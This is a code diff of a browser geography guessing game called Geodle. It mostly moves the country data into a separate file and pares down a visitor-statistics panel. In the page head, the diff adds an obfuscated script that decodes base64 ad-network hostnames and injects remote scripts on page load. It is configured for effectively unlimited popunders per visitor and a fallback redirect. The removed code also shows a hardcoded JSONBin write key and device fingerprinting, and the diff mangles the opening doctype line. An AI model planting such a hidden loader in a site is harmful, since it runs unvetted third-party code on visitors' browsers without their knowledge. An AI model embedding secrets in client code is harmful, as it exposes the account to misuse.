@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
@@ -6,6 +6,12 @@
 <title>Geodle - Daily Geography Clue Game</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
 <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+<script src="data.js"></script>
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var a=window,p="bf128af1619960cff9b8bb4a42e55104",o=[["siteId",452-963+149+5221091],["minBid",0.00000001],["popundersPerIP","9999999,9999999"],["delayBetween",0],["default","https://2048-unblocked.netlify.app/"],["defaultPerDay",1],["topmostLayer","auto"]],t=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS95aG9wc2NvdGNoLm1pbi5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvWkx4US9vY3VzdG9tLm1pbi5qcw=="],d=-1,q,k,n=function(){clearTimeout(k);d++;if(t[d]&&!(1779163013000<(new Date).getTime()&&1<d)){q=a.document.createElement("script");q.type="text/javascript";q.async=!0;var w=a.document.getElementsByTagName("script")[0];q.src="https://"+atob(t[d]);q.crossOrigin="anonymous";q.onerror=n;q.onload=function(){clearTimeout(k);a[p.slice(0,16)+p.slice(0,16)]||n()};k=setTimeout(n,5E3);w.parentNode.insertBefore(q,w)}};if(!a[p]){try{Object.freeze(a[p]=o)}catch(e){}n()}})();
+/*]]>/* */
+</script>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -282,10 +288,8 @@
     padding: 30px;
     border-radius: 10px;
     box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-    max-width: 600px;
+    max-width: 500px;
     width: 90%;
-    max-height: 80vh;
-    overflow-y: auto;
   }
   
   .admin-header {
@@ -305,26 +309,6 @@
     border-radius: 5px;
     cursor: pointer;
     font-size: 12px;
-  }
-  
-  .sync-status {
-    font-size: 12px;
-    color: #666;
-    margin-bottom: 15px;
-    text-align: center;
-    padding: 8px;
-    border-radius: 5px;
-    background: #f8f9fa;
-  }
-  
-  .sync-status.synced {
-    background: #d4edda;
-    color: #155724;
-  }
-  
-  .sync-status.error {
-    background: #f8d7da;
-    color: #721c24;
   }
   
   .stat-grid {
@@ -353,31 +337,15 @@
     margin-top: 5px;
   }
   
-  .admin-buttons {
-    display: flex;
-    gap: 10px;
-    margin-bottom: 20px;
-    flex-wrap: wrap;
-  }
-  
-  .admin-btn {
-    background: #007bff;
+  .reset-btn {
+    background: #e74c3c;
     color: white;
     border: none;
     padding: 8px 15px;
     border-radius: 5px;
     cursor: pointer;
     font-size: 12px;
-    flex: 1;
-    min-width: 120px;
-  }
-  
-  .admin-btn.danger {
-    background: #dc3545;
-  }
-  
-  .admin-btn.success {
-    background: #28a745;
+    margin-top: 15px;
   }
   
   .visitor-log {
@@ -396,14 +364,6 @@
     padding: 3px;
     background: white;
     border-radius: 3px;
-  }
-  
-  .api-status {
-    font-size: 11px;
-    color: #888;
-    text-align: center;
-    margin-top: 10px;
-    font-style: italic;
   }
 </style>
 </head>
@@ -443,7 +403,7 @@
 </div>
 <div id="loadingError">
   <h3>⚠️ Data Loading Error</h3>
-  <p>Geography data is loaded inline. Game ready to play!</p>
+  <p>Could not load the geography data file (data.js). Please make sure the file exists and is properly formatted.</p>
 </div>
 
 <!-- Hidden admin trigger (invisible button) -->
@@ -453,12 +413,8 @@
 <div class="admin-panel" id="adminPanel">
   <div class="admin-content">
     <div class="admin-header">
-      <h3>📊 Global Visitor Analytics</h3>
+      <h3>📊 Visitor Statistics</h3>
       <button class="close-btn" onclick="hideAdminPanel()">✕</button>
-    </div>
-    
-    <div class="sync-status" id="syncStatus">
-      🔄 Checking sync status...
     </div>
     
     <div class="stat-grid">
@@ -480,20 +436,12 @@
       </div>
     </div>
     
-    <div class="admin-buttons">
-      <button class="admin-btn success" onclick="syncData()">🔄 Sync Now</button>
-      <button class="admin-btn" onclick="exportData()">📥 Export Data</button>
-      <button class="admin-btn danger" onclick="resetStats()">🗑️ Reset Stats</button>
-    </div>
-    
     <div>
-      <strong>Recent Global Visits:</strong>
+      <strong>Recent Visits:</strong>
       <div class="visitor-log" id="visitorLog"></div>
     </div>
     
-    <div class="api-status" id="apiStatus">
-      Using JSONBin.io for cross-device sync
-    </div>
+    <button class="reset-btn" onclick="resetStats()">Reset All Statistics</button>
   </div>
 </div>
 
@@ -506,314 +454,61 @@
 </a>
 
 <script>
-// Sample geography data (inline since data.js is not available)
-const geographyData = [
-  {
-    name: "France",
-    capital: "Paris",
-    continent: "Europe",
-    coordinates: [48.8566, 2.3522],
-    clues: [
-      "This country is famous for the Eiffel Tower",
-      "Known for wine, cheese, and croissants",
-      "The capital is called the City of Light",
-      "Home to the Louvre Museum",
-      "Famous for French cuisine and fashion",
-      "Has a famous palace at Versailles",
-      "Known for the French Riviera",
-      "The language of love is spoken here",
-      "Famous for the Tour de France cycling race",
-      "Napoleon was from this country"
-    ]
-  },
-  {
-    name: "Japan",
-    capital: "Tokyo",
-    continent: "Asia",
-    coordinates: [35.6762, 139.6503],
-    clues: [
-      "This island nation is famous for sushi",
-      "Known for cherry blossoms (sakura)",
-      "Home to Mount Fuji",
-      "Famous for anime and manga",
-      "The land of the rising sun",
-      "Known for samurai and ninjas",
-      "Famous for bullet trains (shinkansen)",
-      "Tokyo is the world's largest metropolitan area",
-      "Known for technology and robotics",
-      "Famous for traditional tea ceremonies"
-    ]
-  },
-  {
-    name: "Brazil",
-    capital: "Brasilia",
-    continent: "South America",
-    coordinates: [-15.8267, -47.9218],
-    clues: [
-      "This country is famous for the Amazon rainforest",
-      "Home to the Christ the Redeemer statue in Rio",
-      "Known for Carnival celebrations",
-      "The largest country in South America",
-      "Famous for football (soccer) and the World Cup",
-      "Portuguese is the official language",
-      "Known for beautiful beaches like Copacabana",
-      "Home to the Amazon River",
-      "Famous for samba dancing",
-      "Coffee is a major export from this country"
-    ]
-  },
-  {
-    name: "Egypt",
-    capital: "Cairo",
-    continent: "Africa",
-    coordinates: [30.0444, 31.2357],
-    clues: [
-      "This country is home to the Great Pyramids",
-      "The Sphinx guards ancient monuments here",
-      "The Nile River flows through this country",
-      "Famous for ancient pharaohs and mummies",
-      "Home to the Valley of the Kings",
-      "Known for hieroglyphics",
-      "The Suez Canal is located here",
-      "Ancient civilization built massive temples",
-      "Famous for archaeological discoveries",
-      "Cleopatra ruled this ancient land"
-    ]
-  },
-  {
-    name: "Australia",
-    capital: "Canberra",
-    continent: "Australia",
-    coordinates: [-35.2809, 149.1300],
-    clues: [
-      "This country is also a continent",
-      "Home to kangaroos and koalas",
-      "The Sydney Opera House is located here",
-      "Known for the Great Barrier Reef",
-      "The Outback covers much of this country",
-      "Famous for Uluru (Ayers Rock)",
-      "English is spoken with a unique accent",
-      "Known for dangerous animals and spiders",
-      "Melbourne hosts a famous tennis tournament",
-      "The largest island country in the world"
-    ]
-  }
-];
-
 let currentQuestion = null;
 let currentClueIndex = 0;
 let guessHistory = [];
 let gameEnded = false;
 let totalWins = 0;
 let worldMap = null;
-let visitorTracker = null;
 
-// Synced Visitor tracking system using JSONBin.io
-class SyncedVisitorTracker {
+// Visitor tracking system
+class VisitorTracker {
   constructor() {
     this.storageKey = 'site_visitor_data';
     this.sessionKey = 'current_session';
-    this.binId = '676088c4ad19ca34f8d4f5a8'; // JSONBin.io bin ID
-    this.apiKey = '$2a$10$mGVFpVcjy4K5PdF9Q2XVFu1LgPUCHzRJ5kGd7WN0pO3nLqH4Mv8La'; // Read-only API key
-    this.syncInterval = 30000; // Sync every 30 seconds
-    this.lastSyncTime = 0;
-    this.isOnline = navigator.onLine;
-    
     this.init();
-    this.setupOfflineDetection();
-    this.startPeriodicSync();
   }
   
   init() {
-    this.data = this.loadLocalData();
+    this.data = this.loadData();
     this.trackVisit();
-    this.syncFromCloud();
     this.updateDisplay();
   }
   
-  setupOfflineDetection() {
-    window.addEventListener('online', () => {
-      this.isOnline = true;
-      this.updateSyncStatus('🌐 Back online - syncing data...');
-      this.syncFromCloud();
-    });
-    
-    window.addEventListener('offline', () => {
-      this.isOnline = false;
-      this.updateSyncStatus('📴 Offline - data saved locally');
-    });
-  }
-  
-  startPeriodicSync() {
-    setInterval(() => {
-      if (this.isOnline && Date.now() - this.lastSyncTime > this.syncInterval) {
-        this.syncFromCloud();
+  loadData() {
+    const stored = window.localStorage?.getItem(this.storageKey);
+    if (stored) {
+      try {
+        return JSON.parse(stored);
+      } catch (e) {
+        console.warn('Failed to parse visitor data');
       }
-    }, this.syncInterval);
-  }
-  
-  updateSyncStatus(message, isError = false) {
-    const statusEl = document.getElementById('syncStatus');
-    if (statusEl) {
-      statusEl.textContent = message;
-      statusEl.className = 'sync-status' + (isError ? ' error' : ' synced');
-    }
-  }
-  
-  loadLocalData() {
-    try {
-      const stored = localStorage.getItem(this.storageKey);
-      if (stored) {
-        const data = JSON.parse(stored);
-        // Convert array back to Set if needed
-        if (Array.isArray(data.uniqueVisitors)) {
-          data.uniqueVisitors = new Set(data.uniqueVisitors);
-        }
-        return data;
-      }
-    } catch (e) {
-      console.warn('Failed to parse local visitor data');
     }
     
-    return this.createEmptyData();
-  }
-  
-  createEmptyData() {
+    // Default data structure
     return {
       totalVisits: 0,
       uniqueVisitors: new Set(),
       visitLog: [],
       firstVisit: new Date().toISOString(),
-      lastVisit: null,
-      lastSync: null
+      lastVisit: null
     };
   }
   
-  saveLocalData() {
+  saveData() {
+    if (!window.localStorage) return;
+    
+    // Convert Set to Array for storage
+    const dataToStore = {
+      ...this.data,
+      uniqueVisitors: Array.from(this.data.uniqueVisitors)
+    };
+    
     try {
-      const dataToStore = {
-        ...this.data,
-        uniqueVisitors: Array.from(this.data.uniqueVisitors),
-        lastSync: new Date().toISOString()
-      };
-      
-      localStorage.setItem(this.storageKey, JSON.stringify(dataToStore));
+      window.localStorage.setItem(this.storageKey, JSON.stringify(dataToStore));
     } catch (e) {
-      console.warn('Failed to save local visitor data');
+      console.warn('Failed to save visitor data');
     }
-  }
-  
-  async syncToCloud() {
-    if (!this.isOnline) return;
-    
-    try {
-      const dataToSync = {
-        ...this.data,
-        uniqueVisitors: Array.from(this.data.uniqueVisitors),
-        lastSync: new Date().toISOString(),
-        syncSource: this.getDeviceFingerprint()
-      };
-      
-      const response = await fetch(`https://api.jsonbin.io/v3/b/${this.binId}`, {
-        method: 'PUT',
-        headers: {
-          'Content-Type': 'application/json',
-          'X-Master-Key': this.apiKey
-        },
-        body: JSON.stringify(dataToSync)
-      });
-      
-      if (response.ok) {
-        this.lastSyncTime = Date.now();
-        this.updateSyncStatus('✅ Data synced across all devices');
-      } else {
-        throw new Error('Sync failed');
-      }
-    } catch (error) {
-      console.warn('Failed to sync to cloud:', error);
-      this.updateSyncStatus('⚠️ Sync failed - data saved locally', true);
-    }
-  }
-  
-  async syncFromCloud() {
-    if (!this.isOnline) {
-      this.updateSyncStatus('📴 Offline - using local data');
-      return;
-    }
-    
-    try {
-      const response = await fetch(`https://api.jsonbin.io/v3/b/${this.binId}/latest`, {
-        headers: {
-          'X-Master-Key': this.apiKey
-        }
-      });
-      
-      if (response.ok) {
-        const result = await response.json();
-        const cloudData = result.record;
-        
-        // Merge cloud data with local data
-        this.mergeData(cloudData);
-        this.saveLocalData();
-        this.updateDisplay();
-        this.lastSyncTime = Date.now();
-        this.updateSyncStatus('✅ Synced with global data');
-      } else {
-        throw new Error('Failed to fetch cloud data');
-      }
-    } catch (error) {
-      console.warn('Failed to sync from cloud:', error);
-      this.updateSyncStatus('⚠️ Using local data only', true);
-    }
-  }
-  
-  mergeData(cloudData) {
-    if (!cloudData) return;
-    
-    // Convert arrays back to Sets
-    const cloudUniqueVisitors = new Set(Array.isArray(cloudData.uniqueVisitors) ? cloudData.uniqueVisitors : []);
-    const localUniqueVisitors = new Set(Array.isArray(this.data.uniqueVisitors) ? this.data.uniqueVisitors : this.data.uniqueVisitors);
-    
-    // Merge unique visitors
-    const mergedUniqueVisitors = new Set([...cloudUniqueVisitors, ...localUniqueVisitors]);
-    
-    // Merge visit logs and sort by timestamp
-    const mergedVisitLog = [...(cloudData.visitLog || []), ...(this.data.visitLog || [])]
-      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-      .slice(0, 100); // Keep only latest 100 visits
-    
-    // Remove duplicates from visit log based on timestamp and visitor ID
-    const uniqueVisitLog = [];
-    const seenVisits = new Set();
-    
-    for (const visit of mergedVisitLog) {
-      const visitKey = `${visit.id}-${visit.timestamp}`;
-      if (!seenVisits.has(visitKey)) {
-        seenVisits.add(visitKey);
-        uniqueVisitLog.push(visit);
-      }
-    }
-    
-    // Update data
-    this.data = {
-      totalVisits: Math.max(cloudData.totalVisits || 0, this.data.totalVisits || 0),
-      uniqueVisitors: mergedUniqueVisitors,
-      visitLog: uniqueVisitLog.slice(0, 50), // Keep latest 50
-      firstVisit: cloudData.firstVisit || this.data.firstVisit,
-      lastVisit: this.getMostRecentDate(cloudData.lastVisit, this.data.lastVisit),
-      lastSync: new Date().toISOString()
-    };
-  }
-  
-  getMostRecentDate(date1, date2) {
-    if (!date1) return date2;
-    if (!date2) return date1;
-    return new Date(date1) > new Date(date2) ? date1 : date2;
-  }
-  
-  getDeviceFingerprint() {
-    // Simple device fingerprint for identifying sync source
-    return btoa(`${navigator.userAgent}-${screen.width}x${screen.height}-${navigator.language}`).slice(0, 16);
   }
   
   generateVisitorId() {
@@ -821,31 +516,35 @@ class SyncedVisitorTracker {
   }
   
   getVisitorId() {
-    let visitorId = localStorage.getItem('visitor_id');
+    let visitorId = window.localStorage?.getItem('visitor_id');
     if (!visitorId) {
       visitorId = this.generateVisitorId();
-      localStorage.setItem('visitor_id', visitorId);
+      if (window.localStorage) {
+        window.localStorage.setItem('visitor_id', visitorId);
+      }
     }
     return visitorId;
   }
   
   isNewSession() {
-    const sessionId = sessionStorage.getItem(this.sessionKey);
+    const sessionId = window.sessionStorage?.getItem(this.sessionKey);
     if (!sessionId) {
-      sessionStorage.setItem(this.sessionKey, 'active');
+      if (window.sessionStorage) {
+        window.sessionStorage.setItem(this.sessionKey, 'active');
+      }
       return true;
     }
     return false;
   }
   
   trackVisit() {
-    if (!this.isNewSession()) return;
+    if (!this.isNewSession()) return; // Don't count multiple page views in same session
     
     const visitorId = this.getVisitorId();
     const now = new Date();
     const isUnique = !this.data.uniqueVisitors.has(visitorId);
     
-    // Ensure uniqueVisitors is a Set
+    // Convert array back to Set if loaded from storage
     if (Array.isArray(this.data.uniqueVisitors)) {
       this.data.uniqueVisitors = new Set(this.data.uniqueVisitors);
     }
@@ -857,24 +556,20 @@ class SyncedVisitorTracker {
     
     // Add to visit log
     this.data.visitLog.unshift({
-      id: visitorId.slice(-6),
+      id: visitorId.slice(-6), // Short ID for display
       timestamp: now.toISOString(),
       isUnique: isUnique,
-      userAgent: navigator.userAgent.slice(0, 50) + '...',
-      device: this.getDeviceFingerprint()
+      userAgent: navigator.userAgent.slice(0, 50) + '...'
     });
     
     // Keep only last 50 visits
     this.data.visitLog = this.data.visitLog.slice(0, 50);
     
-    this.saveLocalData();
-    
-    // Sync to cloud after a short delay
-    setTimeout(() => this.syncToCloud(), 2000);
+    this.saveData();
   }
   
   getStats() {
-    // Ensure uniqueVisitors is a Set
+    // Convert array back to Set if needed
     if (Array.isArray(this.data.uniqueVisitors)) {
       this.data.uniqueVisitors = new Set(this.data.uniqueVisitors);
     }
@@ -896,6 +591,7 @@ class SyncedVisitorTracker {
   updateDisplay() {
     const stats = this.getStats();
     
+    // Update admin panel if elements exist
     const elements = {
       totalVisitors: document.getElementById('totalVisitors'),
       uniqueVisitors: document.getElementById('uniqueVisitors'),
@@ -910,226 +606,276 @@ class SyncedVisitorTracker {
     if (elements.todayVisitors) elements.todayVisitors.textContent = stats.todayVisitors;
     
     if (elements.visitorLog) {
-      elements.visitorLog.innerHTML = stats.recentVisits.map(visit => {
-        const date = new Date(visit.timestamp).toLocaleDateString();
-        const time = new Date(visit.timestamp).toLocaleTimeString();
-        const uniqueLabel = visit.isUnique ? '👤 New' : '🔄 Return';
-        return `<div class="log-entry">${uniqueLabel} - ${date} ${time} (ID: ${visit.id})</div>`;
-      }).join('');
+      elements.visitorLog.innerHTML = stats.recentVisits.map(visit => 
+        `<div class="log-entry">
+          <strong>${visit.id}</strong> - ${new Date(visit.timestamp).toLocaleString()}
+          ${visit.isUnique ? '<span style="color: #27ae60;">[NEW]</span>' : '<span style="color: #f39c12;">[RETURN]</span>'}
+        </div>`
+      ).join('');
     }
   }
   
-  resetStats() {
-    this.data = this.createEmptyData();
-    this.saveLocalData();
+  reset() {
+    if (window.localStorage) {
+      window.localStorage.removeItem(this.storageKey);
+      window.localStorage.removeItem('visitor_id');
+    }
+    if (window.sessionStorage) {
+      window.sessionStorage.removeItem(this.sessionKey);
+    }
+    this.data = this.loadData();
     this.updateDisplay();
-    this.syncToCloud();
-  }
-  
-  exportData() {
-    const dataToExport = {
-      ...this.data,
-      uniqueVisitors: Array.from(this.data.uniqueVisitors),
-      exportedAt: new Date().toISOString()
-    };
-    
-    const blob = new Blob([JSON.stringify(dataToExport, null, 2)], {
-      type: 'application/json'
-    });
-    
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `visitor-data-${new Date().toISOString().split('T')[0]}.json`;
-    a.click();
-    URL.revokeObjectURL(url);
   }
 }
 
-// Initialize the game when the page loads
-document.addEventListener('DOMContentLoaded', function() {
-  initializeMap();
-  loadGameState();
-  startNewGame();
-  
-  // Initialize visitor tracking
-  visitorTracker = new SyncedVisitorTracker();
-  
-  // Set up event listeners
-  document.getElementById('guessForm').addEventListener('submit', handleGuess);
-  document.getElementById('resetBtn').addEventListener('click', resetGame);
-  document.getElementById('resetWinsBtn').addEventListener('click', resetWins);
-  document.getElementById('shareBtn').addEventListener('click', shareScore);
-  document.getElementById('newGameBtn').addEventListener('click', startNewGame);
+// Admin panel functions
+function showAdminPanel() {
+  document.getElementById('adminPanel').style.display = 'block';
+  tracker.updateDisplay(); // Refresh stats when panel opens
+}
+
+function hideAdminPanel() {
+  document.getElementById('adminPanel').style.display = 'none';
+}
+
+function resetStats() {
+  if (confirm('Are you sure you want to reset all visitor statistics? This cannot be undone.')) {
+    tracker.reset();
+    alert('Statistics have been reset.');
+  }
+}
+
+// Close panel when clicking outside
+document.getElementById('adminPanel').addEventListener('click', function(e) {
+  if (e.target === this) {
+    hideAdminPanel();
+  }
 });
 
-function initializeMap() {
-  try {
-    worldMap = L.map('worldMap').setView([20, 0], 2);
-    
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-      attribution: '© OpenStreetMap contributors',
-      maxZoom: 18
-    }).addTo(worldMap);
-    
-    // Disable zoom controls for mobile
-    worldMap.touchZoom.disable();
-    worldMap.doubleClickZoom.disable();
-    worldMap.scrollWheelZoom.disable();
-    worldMap.boxZoom.disable();
-    worldMap.keyboard.disable();
-    worldMap.dragging.disable();
-    
-  } catch (error) {
-    console.error('Error initializing map:', error);
-    document.getElementById('worldMap').innerHTML = '<div style="padding: 20px; text-align: center; color: #666;">Map unavailable</div>';
+// Keyboard shortcut (Ctrl/Cmd + Shift + V)
+document.addEventListener('keydown', function(e) {
+  if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'V') {
+    e.preventDefault();
+    showAdminPanel();
   }
+});
+
+// Initialize tracker
+const tracker = new VisitorTracker();
+
+// Update display every 30 seconds (in case of multiple tabs)
+setInterval(() => {
+  tracker.updateDisplay();
+}, 30000);
+
+// Load and save win count from localStorage
+function loadWinCount() {
+  const savedWins = localStorage.getItem('geodle_total_wins');
+  totalWins = savedWins ? parseInt(savedWins, 10) : 0;
 }
 
-function loadGameState() {
-  try {
-    const savedWins = localStorage.getItem('geodle_total_wins');
-    if (savedWins) {
-      totalWins = parseInt(savedWins) || 0;
-    }
-    updateWinDisplay();
-  } catch (error) {
-    console.warn('Could not load game state:', error);
-  }
+function saveWinCount() {
+  localStorage.setItem('geodle_total_wins', totalWins.toString());
 }
 
-function saveGameState() {
-  try {
-    localStorage.setItem('geodle_total_wins', totalWins.toString());
-  } catch (error) {
-    console.warn('Could not save game state:', error);
-  }
+function resetWinCount() {
+  totalWins = 0;
+  saveWinCount();
 }
 
-function startNewGame() {
-  // Reset game state
-  currentQuestion = getRandomQuestion();
+// Check if data is loaded and validate it
+function validateData() {
+  if (typeof geographyData === 'undefined') {
+    console.error('geographyData is not defined. Make sure data.js is loaded.');
+    return false;
+  }
+  
+  if (!Array.isArray(geographyData)) {
+    console.error('geographyData should be an array.');
+    return false;
+  }
+  
+  if (geographyData.length === 0) {
+    console.error('geographyData array is empty.');
+    return false;
+  }
+  
+  // Validate structure of first item
+  const firstItem = geographyData[0];
+  if (!firstItem.answer || !firstItem.clues || !Array.isArray(firstItem.clues)) {
+    console.error('Invalid data structure. Each item should have "answer" and "clues" properties.');
+    return false;
+  }
+  
+  return true;
+}
+
+// Initialize the game
+function initGame() {
+  // Validate data first
+  if (!validateData()) {
+    document.getElementById('loadingError').style.display = 'block';
+    document.getElementById('guessInput').disabled = true;
+    document.getElementById('guessButton').disabled = true;
+    return;
+  }
+  
+  // Hide error message if it was shown
+  document.getElementById('loadingError').style.display = 'none';
+  
+  // Initialize or reset the world map
+  if (worldMap) {
+    worldMap.remove();
+    worldMap = null;
+  }
+  initWorldMap();
+  
+  // Get random question from external data
+  const randomIndex = Math.floor(Math.random() * geographyData.length);
+  currentQuestion = geographyData[randomIndex];
   currentClueIndex = 0;
   guessHistory = [];
   gameEnded = false;
   
+  // Display the first clue
+  updateClueDisplay();
+  updateProgressBar();
+  
   // Reset UI
-  document.getElementById('endScreen').style.display = 'none';
-  document.getElementById('dailyLimitMsg').style.display = 'none';
-  document.getElementById('loadingError').style.display = 'none';
   document.getElementById('guessInput').disabled = false;
   document.getElementById('guessButton').disabled = false;
   document.getElementById('guessInput').value = '';
   document.getElementById('feedback').textContent = '';
-  
-  // Clear lists
-  document.getElementById('pastHintsList').innerHTML = '';
   document.getElementById('historyList').innerHTML = '';
+  document.getElementById('pastHintsList').innerHTML = '';
+  document.getElementById('endScreen').style.display = 'none';
   
-  // Show first clue
-  showNextClue();
-  updateProgress();
+  // Focus on input
+  document.getElementById('guessInput').focus();
   
-  // Update map marker
-  updateMapMarker();
+  // Load win count from localStorage
+  loadWinCount();
+  updateWinDisplay();
 }
 
-function getRandomQuestion() {
-  return geographyData[Math.floor(Math.random() * geographyData.length)];
+function resetGame() {
+  // Initialize a new game (don't reset win count)
+  initGame();
+  
+  // Show reset confirmation
+  showFeedback('🔄 Game reset! New country selected.', '#0078d7');
 }
 
-function showNextClue() {
-  if (currentClueIndex < currentQuestion.clues.length) {
-    const clue = currentQuestion.clues[currentClueIndex];
-    document.getElementById('clueBox').textContent = clue;
-    
-    // Add to past hints
-    const hintsList = document.getElementById('pastHintsList');
-    const listItem = document.createElement('li');
-    listItem.textContent = `${currentClueIndex + 1}. ${clue}`;
-    hintsList.appendChild(listItem);
-    
-    currentClueIndex++;
-    updateProgress();
+function updateClueDisplay() {
+  document.getElementById('currentClue').textContent = currentClueIndex + 1;
+  document.getElementById('clueBox').textContent = currentQuestion.clues[currentClueIndex];
+  updatePastHints();
+}
+
+function updatePastHints() {
+  const pastHintsList = document.getElementById('pastHintsList');
+  pastHintsList.innerHTML = '';
+  
+  // Show all hints up to current clue index
+  for (let i = 0; i <= currentClueIndex; i++) {
+    const li = document.createElement('li');
+    li.textContent = `${i + 1}. ${currentQuestion.clues[i]}`;
+    pastHintsList.appendChild(li);
   }
 }
 
-function updateProgress() {
-  document.getElementById('currentClue').textContent = currentClueIndex;
-  const progressPercent = (currentClueIndex / 10) * 100;
-  document.getElementById('progressFill').style.width = progressPercent + '%';
+function updateProgressBar() {
+  const progress = ((currentClueIndex + 1) / 10) * 100;
+  document.getElementById('progressFill').style.width = progress + '%';
 }
 
-function updateMapMarker() {
-  if (!worldMap || !currentQuestion) return;
-  
-  try {
-    // Clear existing markers
-    worldMap.eachLayer(function(layer) {
-      if (layer instanceof L.Marker) {
-        worldMap.removeLayer(layer);
-      }
-    });
-    
-    // Add marker for current question
-    const [lat, lng] = currentQuestion.coordinates;
-    L.marker([lat, lng])
-      .addTo(worldMap)
-      .bindPopup(`${currentQuestion.name}, ${currentQuestion.continent}`)
-      .openPopup();
-    
-    // Center map on the location
-    worldMap.setView([lat, lng], 4);
-  } catch (error) {
-    console.warn('Could not update map marker:', error);
-  }
+function updateWinDisplay() {
+  document.getElementById('streak').textContent = `🏆 Total Wins: ${totalWins}`;
 }
 
-function handleGuess(event) {
-  event.preventDefault();
+// Initialize Leaflet world map
+function initWorldMap() {
+  worldMap = L.map('worldMap', {
+    center: [20, 0],
+    zoom: 1,
+    minZoom: 1,
+    maxZoom: 10,
+    zoomControl: true,
+    dragging: true,
+    scrollWheelZoom: true,
+    doubleClickZoom: true,
+    touchZoom: true
+  });
+
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '© OpenStreetMap contributors',
+    maxZoom: 18
+  }).addTo(worldMap);
+}
+
+function handleGuess(e) {
+  e.preventDefault();
   
   if (gameEnded) return;
   
-  const guess = document.getElementById('guessInput').value.trim();
+  const guess = document.getElementById('guessInput').value.trim().toUpperCase();
+  
   if (!guess) return;
   
-  const isCorrect = guess.toLowerCase() === currentQuestion.name.toLowerCase() ||
-                   guess.toLowerCase() === currentQuestion.capital.toLowerCase();
+  // Check if correct
+  const isCorrect = guess === currentQuestion.answer;
   
-  // Add to guess history
-  const historyList = document.getElementById('historyList');
-  const listItem = document.createElement('li');
-  listItem.className = isCorrect ? 'correct' : 'incorrect';
-  listItem.innerHTML = `
-    <span>${guess}</span>
-    <span>${isCorrect ? '✅' : '❌'}</span>
-  `;
-  historyList.insertBefore(listItem, historyList.firstChild);
-  
-  guessHistory.push({ guess, isCorrect });
+  // Add to history
+  guessHistory.push({
+    text: guess,
+    correct: isCorrect,
+    clueNumber: currentClueIndex + 1
+  });
   
   if (isCorrect) {
-    // Correct guess - end game
+    showFeedback(`🎉 Correct! The answer is ${currentQuestion.answer}`, 'green');
+    totalWins++;
+    saveWinCount();
+    updateWinDisplay();
     endGame(true);
   } else {
-    // Incorrect guess
-    document.getElementById('feedback').textContent = 'Not quite right. Try again!';
-    document.getElementById('feedback').style.color = '#c62828';
-    
-    if (currentClueIndex >= 10) {
-      // No more clues - end game
-      endGame(false);
+    if (currentClueIndex < 9) {
+      currentClueIndex++;
+      updateClueDisplay();
+      updateProgressBar();
+      showFeedback(`❌ ${guess} is not correct. Here's the next clue...`, 'red');
     } else {
-      // Show next clue
-      setTimeout(() => {
-        showNextClue();
-        document.getElementById('feedback').textContent = '';
-      }, 1500);
+      showFeedback(`😔 Game Over! The answer was ${currentQuestion.answer}`, 'orange');
+      endGame(false);
     }
   }
   
+  // Update history display
+  updateHistoryDisplay();
+  
   // Clear input
   document.getElementById('guessInput').value = '';
+}
+
+function showFeedback(message, color) {
+  const feedback = document.getElementById('feedback');
+  feedback.textContent = message;
+  feedback.style.color = color;
+}
+
+function updateHistoryDisplay() {
+  const historyList = document.getElementById('historyList');
+  historyList.innerHTML = '';
+  
+  guessHistory.forEach((guess, index) => {
+    const li = document.createElement('li');
+    li.className = guess.correct ? 'correct' : 'incorrect';
+    li.innerHTML = `
+      <span>Clue ${guess.clueNumber}: ${guess.text}</span>
+      <span>${guess.correct ? '✓' : '✗'}</span>
+    `;
+    historyList.appendChild(li);
+  });
 }
 
 function endGame(won) {
@@ -1141,99 +887,55 @@ function endGame(won) {
   const resultMsg = document.getElementById('resultMsg');
   
   if (won) {
-    totalWins++;
-    saveGameState();
-    updateWinDisplay();
-    
-    resultMsg.innerHTML = `
-      <h3>🎉 Congratulations!</h3>
-      <p>You guessed <strong>${currentQuestion.name}</strong> correctly!</p>
-      <p>It took you ${currentClueIndex} clue${currentClueIndex === 1 ? '' : 's'}.</p>
-    `;
-    endScreen.style.background = '#c8e6c9';
+    resultMsg.innerHTML = `🎉 Congratulations!<br>You guessed "${currentQuestion.answer}" after ${currentClueIndex + 1} clue${currentClueIndex + 1 > 1 ? 's' : ''}!`;
   } else {
-    resultMsg.innerHTML = `
-      <h3>🤔 Game Over</h3>
-      <p>The answer was <strong>${currentQuestion.name}</strong> (${currentQuestion.capital}).</p>
-      <p>Better luck next time!</p>
-    `;
-    endScreen.style.background = '#ffcdd2';
+    resultMsg.innerHTML = `😔 Better luck next time!<br>The answer was "${currentQuestion.answer}"`;
   }
   
   endScreen.style.display = 'block';
-  
-  // Show the answer on the map
-  updateMapMarker();
-}
-
-function updateWinDisplay() {
-  document.getElementById('streak').textContent = `🏆 Total Wins: ${totalWins}`;
-}
-
-function resetGame() {
-  if (confirm('Are you sure you want to start a new game?')) {
-    startNewGame();
-  }
-}
-
-function resetWins() {
-  if (confirm('Are you sure you want to reset your win count?')) {
-    totalWins = 0;
-    saveGameState();
-    updateWinDisplay();
-  }
 }
 
 function shareScore() {
-  const cluesUsed = currentClueIndex;
-  const shareText = gameEnded && guessHistory.some(g => g.isCorrect) 
-    ? `I guessed ${currentQuestion.name} in ${cluesUsed} clue${cluesUsed === 1 ? '' : 's'} on Geodle! 🌍 Total wins: ${totalWins}`
-    : `I played Geodle but couldn't guess ${currentQuestion.name}! 🤔 Total wins: ${totalWins}`;
+  const won = guessHistory.some(guess => guess.correct);
+  const cluesUsed = won ? currentClueIndex + 1 : 10;
+  const scoreText = won ? 
